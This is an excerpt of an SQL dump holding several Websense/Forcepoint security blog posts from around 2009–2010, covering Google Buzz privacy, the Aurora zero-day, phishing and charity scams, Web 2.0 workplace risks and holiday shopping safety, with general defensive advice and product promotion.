to follow any more. You can also block people, preventing them from following you. Take your time and check that you are happy with everyone on your list.\n\nPicture 6: Unfollow and block people in your Buzz list\nGoogle Buzz has just showed us how these social networks are getting connected together and how they are likely to get closer and closer in the near future. They are a quickly-expanding open platform for spamming, phishing, and fraud, all brought to you automatically.\nEverywhere in the social network might appear to be good, and at first it sounds like a good idea to connect them together. However, the great Buzz has only one piece of advice for Dorothy: click your heels three times and repeat \"There\'s no place like home.\"\nSecurity Researcher: Tamas Rudnai', 'https://www.forcepoint.com/blog/security-labs/wizard-buzz\n');

As of January 21, only 25% of AV vendors tracked protect against the payload according to this VT report. Websense® Security Labs™ has published important information – available below – regarding this threat.\n\nWhat You Should Know\n\nWebsense provided its customers with zero day protection from this attack before it began in December.  Aurora, and a growing number of similar Web-based threats, highlight the need for Websense Web, data, and email technology, which go beyond legacy security controls.  Websense provides real-time protection for previously unknown threats like Aurora as they propagate over the Web and across email, targeting sensitive data stored on systems inside and outside the corporate network, helping to prevent systems from getting infected and sensitive data from being compromised. Put simply, Websense provides the most advanced security for modern threats.\n\n \n\nWith Websense, customers receive:\n\nReal-time malware protection that goes beyond anti-virus to address previously undiscovered threats like Aurora on-the-fly, when they are first introduced.\n	Advanced content security that spans Web, email and other channels to intelligently scan data coming in and out for legacy threats, exploits, script-based attacks, and data loss.\n	Comprehensive protection for users at the corporate office, branch office, and who are mobile to carry security across the entire enterprise. \nMore Information on Aurora\n\nTimeline\n\n\n\nThe Aurora attacks are examples of what are being referred to as Advanced Persistent Threats (APT), described well by TaoSecurity in three simple points. In brief:\n\nAdvanced means the adversary can operate in the full spectrum of computer intrusion.\n	Persistent means the adversary is formally tasked to accomplish a mission.\n	Threat means the adversary is not a piece of mindless code.\nThe impact of these advanced attacks on the targeted organization can be severe and difficult to defend against. In this case, the attacks used complex exploit code delivered on websites. Vulnerable hosts were affected when they simply connected to the site. Post-infection, additional malicious code is downloaded, data is captured and the sent to remote websites.\n\nWebsense has been at the forefront of identifying and protecting our customers from zero-day exploits in the wild for several years.  We expect that the number of attacks of this type will grow with time.  We are now seeing other attackers use the Aurora zero-day exploit to infect vulnerable hosts. Since the code is now publicly available, we expect the next wave of attacks to come from cybercriminals whose techniques are equally sophisticated, but whose motives are somewhat different. They will most certainly be hunting for data, but it will be for monetary gain rather than information gathering. \n\nLearn More\n\nWebsense Security Labs:\n\nhttp://securitylabs.websense.com/content/Alerts/3536.aspx  \n\nhttp://securitylabs.websense.com/content/Blogs/3534.aspx\n\nhttp://securitylabs.websense.com/content/Blogs/3530.aspx\n\nOther Resources: http://www.mandiant.com/services/advanced_persistent_threat/.http://taosecurity.blogspot.com/2010/01/what-is-apt-and-what-does-it-want.htmlhttp://www.microsoft.com/technet/security/bulletin/ms06-055.mspxhttp://www.microsoft.com/technet/security/bulletin/MS06-001.mspx\n\nFor information about how to be protected against advanced threats, visit http://www.websense.com.\n\nFor up-to-date information about Aurora, and for other breaking security information: http://www.websensesecuritylabs.com', 'https://www.forcepoint.com/blog/insights/security-bulletin-aurora-internet-explorer-zero-day-attack\n');

The files may contain computer viruses. Only open attachments sent by people or groups you know and trust.\n    \n    \n    Make contributions directly to known charitable organizations, rather than relying on others to relay your donation. Preferably, work with charities that you have donated to before, or that are located in your community. Manually type the URL of a reputable charity’s Web site into your browser rather than follow a link from an email. Or better yet, call the charity directly on the phone to make your donation.\n    \n    \n    Never give your personal or financial information to anyone who solicits contributions. Providing that information opens the door to identity theft.\n    \n    \n    Do not trust sites that claim to have discovered viruses on your computer. Immediately close your browser window.

You may even be using LinkedIn and perhaps Facebook for recruiting. Everybody from Oprah to Time magazine is talking about the growth of Twitter and Facebook – but there is much more to Web 2.0 than just social networking, and many areas within your organization may be pushing for more access to Web 2.0 sites and applications on the Internet. Businesses taking advantage of the latest Web 2.0 tools are seeing tangible benefits – from increased revenue to improved collaboration and streamlined processes. As more and more businesses are embracing employee use of Web 2.0 and social networking sites, we, as HR professionals must ask ourselves what role we should play in helping enable safe Web 2.0 access in the workplace.  \nWhat is Web 2.0 and why should you care?\nWeb 2.0 is a term used to describe Web sites that allow user-generated content. In the past, Web sites were typically owned by a business or individual who created and took responsibility for all the content on that site. Today, the most popular sites on the Web – and the sites that many of us visit regularly for work -- rely heavily on dynamic content posted by site visitors, and they often link to content from a variety of other sites and sources. Unfortunately, the most popular sites on the Web are also popular with cybercriminals, who use them to distribute spam, spyware, viruses and other types of malicious code to a large number of people. According to research from Websense Security Labs, 70 percent of the top 100 most popular sites on the Internet have hosted malicious code or redirected unsuspecting visitors to other infected sites.  \n\nExamples of Web 2.0 include:\nSocial networking sites, such as Facebook and LinkedIn\n    \n    Blogs\n    \n    Microblogs, such as Twitter\n    \n    Mashups, such as iGoogle\n    \n    Wikis, such as Wikipedia\n    \n    Social bookmarking tools, such as Delicious\n    \n    Video and photo uploading sites, such as YouTube and Flickr\n    \n    Cloud computing sites, such as Google Docs\n    \n    Webmail services, such as gmail, Hotmail and Yahoo\n    \nWhat’s Driving the Demand for Web 2.0 in the Workplace?\n\nWith increasing numbers of the “millennial” generation now in the workforce, employees not only expect access to Web 2.0, but for many it is their preferred method of communication. And it’s not just the youngest generation of workers using the social Web: Facebook reported a 276 percent growth of users in the 35 – 54 year old age segment during the second half of 2008 alone. A recent Websense survey of 1300 organizations around the world showed that 86 percent of IT managers report feeling pressure to allow more employee access to Web 2.0 sites. The pressure often comes from departments like sales and marketing, that want to use social networking sites to communicate with customers and stakeholders. But, perhaps surprisingly, 30 percent of IT managers said they receive pressure from C-level and director level executive staff. Clearly, Web 2.0 has moved to the “mainstream” and has worked its way into all levels and areas of the business.\n\nAre There Real Benefits to Web 2.0 at Work?\nThe excitement around Web 2.0 is not all hype. Web 2.0 allows companies to improve collaboration and information exchange, streamline communication and processes, gather detailed customer and market research, interact with key stakeholders, and drive revenue. There are many interesting examples of organizations that have used Web 2.0 in very compelling ways: \n\nRecruitment – Social networking sites such as LinkedIn and Facebook have become standard tools used by recruiting professionals for identifying and contacting potential candidates. \n    Revenue generation - Dell reports that Twitter has produced $2 million in revenue through product sale alerts.\n    Market research - Kimberly-Clark Corporation created an online community for users of its Scott personal care products. The company analyzes data and customer profile information to identify its most loyal customers and market its products to specific segments (1). \n    Fundraising – The nonprofit Case Foundation launched two highly publicized initiatives aimed at increasing charitable giving through the use of Web-based social networking sites such as Facebook. The initiatives raised more than $1.7 million from over 80,000 donors (2).\nThe potential benefits of Web 2.0 for businesses make it impossible to ignore. In the past, to keep employees safe from inappropriate content and to protect organizations from compliance risks and the malware that permeates the Web, HR professionals often recommended blocking access to social networking and blogging sites. However, today businesses are realizing that not allowing access to Web 2.0 sites works against the company’s own interests. \nRisks Associated with Web 2.0 in the Workplace\nYet, with potential benefits come potential risks. While many organizations have put Web 2.0 to good use, concerns still exist around employees viewing inappropriate content while at work, accidentally exposing the organization’s computer network to viruses and other malware, or posting intellectual property or other valuable corporate data on blogs and Web 2.0 sites.\nBecause Web 2.0 sites allow anyone to post content, they are easy channels for cyber criminals to use to spread inappropriate content, spyware, viruses and other forms of malware that can infect a company’s computer networks. Cyber criminals rely on the popularity of Web 2.0 sites to reach a large number of victims with their attacks. They also take advantage of peoples’ trusting nature and inclination to click on links shared by online “friends” by posting malicious links in blog comments and on forums and online communities. \nIn addition to the security risks from outside attacks, Web 2.0 brings increased risk for security breaches from the inside. Disgruntled employees can, with the click of a mouse, post confidential corporate information or intellectual property to a blog or other Web 2.0 site. Even good employees with no malicious intent may accidentally cause a data security breach by collaborating on confidential corporate data on an unsecure third-party site like Google Docs or by emailing records to their personal Web-based email address so they can work at home. One must only take a quick scan of the news headlines to see several examples of data breaches which have exposed private employee records, including health records, salary data and social security numbers. \nHow to take advantage of Web 2.0 safely\nOrganizations around the world today are struggling to find the right balance between allowing employee access to Web 2.0 and managing the attendant risks. As an HR professional, you can help guide your organization through this challenge.\nHR, Legal and IT should meet with other areas of the business to understand their reasons for wanting Web 2.0 access and determine the legitimate business use cases. Talk to marketing, sales and other departments to learn the specific ways they want to use social networking sites, blogs and other Web 2.0 applications in their jobs. \nIt’s also important to talk with your IT department about their network security concerns and work with them to develop employee Internet usage policies (especially in regards to using social media sites) and a plan for educating employees on the policies. Also ask IT about the types of technology solutions available to help ensure compliance with relevant regulations and protect important company information in addition to the corporate network. \nWhen it comes to technology, many organizations rely on traditional security solutions like firewalls and antivirus products, but these alone cannot protect from the ever-changing Web 2.0 threats. Information security in a Web 2.0 world requires data loss prevention technology to keep confidential company information from leaking outside the organization (whether intentional or accidental). The data loss prevention technology needs to be combined with a Web security gateway that analyzes the content on a Web page in real-time, as employees visit Web 2.0 sites, and blocks only the inappropriate content and security risks. In other words, employees can still visit a social networking site, but the security technology blocks just the portion of the page that is inappropriate for the workplace – like a gambling application or a link to spyware. \nThe next step is to set the right Internet usage policies for your organization and educate your employees. The technology solution that your company chooses should allow for granular, flexible policies so that based upon an employee’s role, the company can control how much access that person has to Web 2.0 sites, how much time they can spend on those sites, what level of access they have to sensitive corporate information and even what they can do with that information. For example, an employee in HR may have access to all sorts of confidential data about other employees, and they may be allowed access to Web 2.0 sites like LinkedIn and blogs for work purposes – but they should not be able to post that confidential data to public blogs or networks. Good data loss prevention technology takes into account the context of the situation – who is accessing what type of data, where they are trying to send it and by what methods – in order to apply the right policies.  \nIn setting Internet usage policies, HR, often in conjunction with the company’s legal team, needs to define business use and personal use of the Internet, including how to manage use of social networking sites where relationships may blur the line between professional and personal. Create social media guidelines and educate employees not only on the policies but also the reasons the policies are necessary, including maintaining a safe work environment, protecting the employees and company from network security risks, loss of intellectual property or personal data, corporate brand reputation and others. \nBy working with IT and facilitating the conversation with other areas of the business who have legitimate work-related reasons for using Web 2.0 and social media, HR can help guide the company to safely embrace the latest Web 2.0–enabled business tools. \nBiography\nSusan Brown is Vice President of Human Resources at Websense, Inc.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (858, 'The Websense Guide to a Safe Holiday Season Online', 'Carl LeonardSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'by Carl Leonard, Senior Security Research Manager, Websense Security Labs\n\nDuring each holiday season, many people shop for gifts for their friends and loved ones. This year, a recession weary population is hungry for bargains and many of them will grab the chance to avoid the crowds by choosing to shop online. eBay is predicting 85 percent of consumers will maintain or increase their online shopping this holiday season and studies show that 93 percent of consumers plan to buy a gift online.*\n\nThis fact is of particular interest to cyber criminals as it gives some insight into the potential number of opportunities they have to steal personal information like credit card data or otherwise cheat you out of your money. With many consumers using corporate networks to access the Internet in the run up to Christmas, Websense has released a guide for businesses and consumers alike on how to avoid getting more than you bargained for this festive season.\n\nTop tips to avoid getting more than you bargained for this holiday season\n\n#1 The ‘Bargain’ Store Scam\n\nHow it works: One of the major attractions about purchasing things online is that there are often bargains to be had. While looking for a good deal, we may be tempted by low prices and forget to look at who we’re purchasing from. Cyber criminals are all too aware of this and create fake online shops to harvest credit card details and use them for their own gain. Products are often offered at much lower prices than in stores. However, no package will be sent. Your credit card may be charged anyway and the card details sold on the black market.\n\nTempting as some offers can be, unfortunately the old adage is often true, if they sound too good to be true they probably are.\n\nTip for consumers: If you are shopping on an unfamiliar site then check that there is a landline phone number and postal address for you to contact the retailer if there’s a problem. Check the payment connection is secure by looking for the padlock symbol and ensuring there is an HTTPS in the address bar (the ‘s’ stands for secure). Only give your payment card details over a secure connection, and never by email.\n\nTip for businesses: Many employees like to do their online holiday shopping during their lunch hour, and using their work address to make parcel deliveries easier. Companies can set flexible Internet access policies that allow their employees to use the Web for personal use during their lunch hour or other breaks, but they must protect the corporate network from online threats before doing so. By setting realistic Web usage policies your staff will be encouraged to shop safely online during lunch break or out of office hours. The Websense Web Security Gateway can categorize new sites and dynamic Web content in real-time and proactively discover security risks in order to to enable safe and productive use of the Internet.\n\n# 2 The Fancy Dress Disguise\n\nHow it works: In the run-up to the holidays, many people will send e-cards to friends and associates or a link to an amusing video clip. Unfortunately these can sometimes contain hidden malicious extras, or the email may be a phishing scam in fancy dress. Embedded beneath the jolly images can hide malicious URLs containing links to malware or exploit code. This technique is continually evolving to increase the success rate with new attacks becoming more sophisticated in terms of the imagery and lures utilized.\n\nTip for consumers: We all enjoy visiting popular video websites to view the latest joke or program clip. These user generated sites, by their very nature, are constantly being updated, which makes it difficult for traditional malware protection to keep you safe. Installing real-time analysis software can help to mitigate this risk but you should always maintain a healthy suspicion of video content.\n\nIf you receive an e-greeting from ‘a friend’, ‘a colleague’or ‘a family member,’ look carefully at the originating email address, and see if the email is personalized to you – people who actually know you tend to know your name! Perhaps double check with the ‘sender’ that they really did send you the email. If the email links to a URL, look at the address to see where they are re-directing you to BEFORE you click the link. Does the address look different to where the card claims to be from? If any doubt exists about the origin of the mail you should delete it immediately.\n\nTip for businesses: Blended threats (spam emails with embedded URLs) are on the increase and on average 85.6 percent of all unwanted emails contain links to spam sites and/or malicious Web sites. A security solution that integrates Web security and email security should be able to identify links in an email and trace them back to malicious sites or content. Based on this accurate identification, solutions should be able to act in real-time to block the email and any other attempts to access that Web site, view content, or transmit data to that destination.\n\n#3 The Drive-by\n\nHow it works: This is one of the most dangerous types of attacks as no user interaction is required for infection to happen. Simply browsing an infected holiday-themed Web site or news site could allow code to be executed that exploits vulnerabilities in software installed on the machine. Malicious applications could be secretly installed while you’re browsing for this season\'s most popular toys and gifts.\n\nTip for consumers: Many of the most basic scams rely on already identified vulnerabilities in user’s software, browsers or third party plug-in. If users don’t download patches and security updates they leave themselves open to attacks from cyber criminals who aim to either take control of the machine or steal data. Where available, you should always download the most recent updates and patches to protect from these kinds of attacks.\n\nTip for businesses: It is no longer just porn or gambling sites that host malcode. Popular news, travel and shopping sites can be compromised and host malicious code too. In fact, research from Websense Security Labs shows that 77 percent of Web sites with malicious code are actually legitimate sites that have been compromised.\n\nReputation based monitoring is no longer an effective method of protection. Your organization\'s Web security solution should be able to conduct full content analysis and categorization based upon more than just the reputation of the Web site -- it should understand the property type, URL category, lexical and search reputation, history, age geography and neighboring properties of the site, as well as the IP sources and the content on the site itself for real-time risk assessment. Only with this level of security intelligence can threats be blocked accurately and in real-time. Even if a well known and trusted site with a good reputation were compromised, the threat would be prevented.\n\n#4 Unwanted gifts from Anti\n\nHow it works: Social engineering is the name given to the art of tricking a user into performing an action. Rogue antivirus software is an example of a social engineering technique seen often by Websense Security Labs. When browsing the Internet, you might see a pop-up explaining that your computer may be infected and offering to perform a free antivirus scan.\n\n\n\nDon’t be fooled -- there is no scan. Instead, the perpetrators will simply claim to have found a virus on your machine. You’re not really infected but this may encourage you to download or even pay for their fake antivirus software which is actually malicious software. Now the hackers have your credit card details and control of your computer.\n\nTip for consumers: Search engine results are often ‘poisoned’ to lead to malicious software disguised as antivirus software. When you search for popular holiday terms, search engine optimization (SEO) poisoning pushes infected URLs to the top of the search results, to increase the likelihood of you clicking through to the rogue antivirus Web site. Exercise caution when downloading software or accessing Web sites. Keep your guard up. The best guard you have against this attack is your own instinct. If you realize you may have fallen for a scam, contact the appropriate authorities.\n\nTips for businesses: Look for a secure Web gateway solution that provides advanced analytics—including rules, signatures, heuristics and application behaviors—to detect and block proxy avoidance, hacking sites, adult content, botnets, keyloggers, phishing attacks, spyware, and many other types of unsafe content. Independent testing confirms that the Websense Web Security Gateway leads the secure Web gateway market and exceeds analyst criteria for malware protection, data loss prevention, Web 2.0 threat detection, accuracy and effectiveness.\n\n# 5 The Holiday Jigsaw Puzzle\n\nHow it works: The technique, called script fragmentation, involves breaking down malware into smaller pieces in order to beat malware analysis engines. Benign code is embedded in a Web page. When a user visits the page, a small JavaScript routine will slowly request more code from other Web servers a few innocuous bytes at a time. The bytes are stored until all the information has been transferred then the exploit is triggered.\n\n\n\nIt’s a bit like sending a jigsaw one piece at a time. It’s not until all the pieces are collected and put together that the whole nasty picture becomes clear. By this time, the bad guy is already in and can now go on to disable your antivirus and take over the computer\n\nTip for consumers: The attack, which works on all the major browsers, is not a browser vulnerability—it merely takes advantage of the way browsers work. Disabling JavaScript would prevent the attack, however that\'s not a realistic answer for most Web users since it would break the functionality of almost all the top 50 Web sites which require JavaScript to be enabled.\n\nTips for businesses: The entire process—from data being transferred over the network to triggering JavaScript —can slip under the radar because no malicious content touches the file system. It\'s done completely in memory, and content is transferred in such tiny fragments that antivirus engines don\'t have enough context to match any signatures. The answer lies in solutions which scan active content, it is important not only to look at static content that has been put on disk but to be able to detect changes inside of the browser.\n\n*sources: Interactive Media in Retail Group and eBay.', 'https://www.forcepoint.com/blog/insights/websense-guide-safe-holiday-season-online\n');

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (863, 'FBI Warns of Recent Phishing Campaigns Leading to $100 Million in Attempted Losses', 'Forcepoint Sean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Targeted Spear Phishing Attacks Steal Corporate Online Banking Credentials – What Should Businesses do to Protect Themselves? The FBI recently revealed a sobering statistic – email phishing attacks and malicious Trojans targeting public institutions and small-to-medium sized businesses (SMBs) have led to approximately $100 million in attempted losses in the past several months. The phishing emails mainly hit SMBs, schools, court systems and other public institutions and contain either a malicious file attachment or a URL to an infected Web site.\n\nThis kind of attack is known as a spear phishing campaign because the emails are sent to a very specific, targeted group of people. In this case, the phishing lures went to individuals within an organization who can initiate funds transfers and other banking tasks on behalf of the business. Once the recipient is fooled into downloading the attachment or visiting the malicious Web site, the attacker is able to steal the corporate online banking credentials and use them to transfer funds to their own accounts. The funds were typically in increments of less than $10,000 to avoid drawing attention under the banks\' anti-money-laundering reporting requirements.\n\nPhishing campaigns and other types of malicious spam emails are nothing new.  The Websense ThreatSeeker® Network, which delivers security intelligence to all Websense products, scans nearly 10 million emails each hour for unwanted content and malicious code. During the month of September alone, it identified approximately 85 percent of all these emails as spam. Nearly 85 percent of all spam emails included an embedded URL, many of which led to malicious Web sites, and approximately 5 percent of all spam emails scanned during September were targeted phishing attacks. \nAlthough phishing campaigns are not new, what’s perhaps most shocking about the FBI report is how successful the recent attacks have been – given the huge amount of money stolen in just the past several months. Obviously the attackers are becoming very sophisticated in not only who they target, but also in the social engineering tactics they use to trick their victims into disclosing credentials, running a malicious file or visiting an infected Web site. Even FBI Director Robert Mueller admits to nearly falling for a phishing scam that appeared to be an email from his bank – his wife has since banned him from doing the family’s online banking.\nIt’s important to note that the FBI is not saying that people or businesses should refrain from banking online. However, businesses and consumers alike must take the proper precautions to ensure that their data is safe. In addition to educating employees on safe online practices, businesses need the right technologies in place to enforce their security policies – and today that doesn’t mean simply firewalls and anti-virus programs. Today’s sophisticated attacks deliver blended threats that span multiple attack vectors (i.e. spam emails that contain links to malicious Web sites harboring data-stealing malware.)\n\nThe Importance of Integrated Web, Email and Data Security\n\nMany organizations today still try to protect their Web and email communication channels with independent security tactics for each channel and each communication direction: they use email and content filters on outbound communications, separate inbound filtering for spam and viruses entering the network, and Web filtering to block employees from visiting inappropriate Web sites. These separate silos look at the URLs or the email headers, but not both, and they rarely pay attention to the data itself or proactively block its outbound transmission. They react based on a historical view of threats built on outdated inspections, signatures, reputation and behavior. Blended threats easily bypass these inspections by morphing and moving around the Web while stealing data.\n\nOnly a unified content security suite that fully integrates Web, email and data loss prevention can protect businesses and their essential information from blended threats. The Websense essential information protection platform is the only unified content security solution to provide comprehensive protection from blended threats. In the case of these recent spear phishing campaigns, Websense email security would identify and block the phishing email from ever entering the organization’s network, scanning the message for malicious content and applying Web security intelligence to identify and block any embedded URLs that lead to malicious sites. Websense data loss prevention technology would ensure that confidential information is not sent to any unauthorized destinations, whether at the users hand or as a result of a machine infected with a Trojan or other piece of malware. This kind of unified content analysis is unique to Websense, and provides organizations with greater overall security through integrated Web, email and data security intelligence.\nSophisticated spear phishing campaigns like the one the FBI warns about will continue to happen. Businesses cannot realistically stop using the Internet for banking or other business transactions. The only way to protect its essential information and prevent fraud is through a combination of security policies, employee education and technology.', 'https://www.forcepoint.com/blog/insights/fbi-warns-recent-phishing-campaigns-leading-100-million-attempted-losses\n');
